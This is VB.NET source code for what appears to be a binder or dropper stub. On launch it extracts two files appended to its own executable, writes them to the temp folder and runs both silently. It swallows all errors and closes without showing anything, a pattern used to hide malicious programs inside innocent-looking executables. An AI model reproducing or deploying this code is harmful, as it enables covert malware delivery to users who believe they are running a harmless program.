Imports System.IO
Public Class main

    Const FileS = "@@@@@@@@@@@@"
   
    Private Sub main_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        Try
            Dim TPath As String = System.IO.Path.GetTempPath
            Dim file1, filez() As String
            FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
            file1 = Space(LOF(1))
            FileGet(1, file1)
            FileClose(1)
            filez = Split(file1, FileS)
            FileOpen(3, TPath & filez(3), OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
            FilePut(3, filez(1))
            FileClose(3)
            FileOpen(5, TPath & filez(4), OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
            FilePut(5, filez(2))
            FileClose(5)
            Delay(1)
            System.Diagnostics.Process.Start(TPath & filez(3))
            Delay(10)
            System.Diagnostics.Process.Start(TPath & filez(4))

        Catch ex As Exception

        End Try
        Me.Close()

    End Sub

    Private Sub Delay(ByVal DelayInSeconds As Integer)
        Dim ts As TimeSpan
        Dim targetTime As DateTime = DateTime.Now.AddSeconds(DelayInSeconds)
        Do
            ts = targetTime.Subtract(DateTime.Now)
            Application.DoEvents()
            System.Threading.Thread.Sleep(100)
        Loop While ts.TotalSeconds > 0
    End Sub
End Class
